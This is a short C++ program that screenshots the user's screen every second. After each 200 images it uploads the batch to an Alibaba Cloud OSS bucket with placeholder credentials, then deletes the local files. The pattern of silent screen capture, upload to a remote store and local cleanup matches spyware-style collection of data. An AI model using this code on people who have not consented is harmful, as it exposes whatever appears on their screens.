// main.cpp
#include "RedHorseCore.h"
#include <string>

// 初始化OSS账号信息
std::string Endpoint = "yourEndpoint"; 
std::string BucketName = "yourBucketName";
std::string ObjectName = "images";
std::string AccessKeyId = "yourAccessKeyId";
std::string AccessKeySecret = "yourAccessKeySecret";

int32_t wmain() {
    RedHorseCore::init();

    std::wstring baseDir = RedHorseCore::getUserProfile() + L"\\Desktop\\screenshot\\";

    for (int32_t i = 0; i < 2001; ++i) {
        std::wstring filename = baseDir + RedHorseCore::getCurrentTimestamp() + L".bmp";
        std::wcout << L"shooting " << filename << std::endl;
        RedHorseCore::ShootScreen(filename, NULL);
        Sleep(1000);

        // 判断是否可以发送至阿里云OSS
        if (RedHorseCore::HasAtLeast200BmpFiles(baseDir)) {
            RedHorseCore::uploadFiles(BucketName, RedHorseCore::wstring_to_string(baseDir), Endpoint, AccessKeyId, AccessKeySecret);
            RedHorseCore::cleanFolder(baseDir); //清空文件夹
        }
    }
    return 0;
}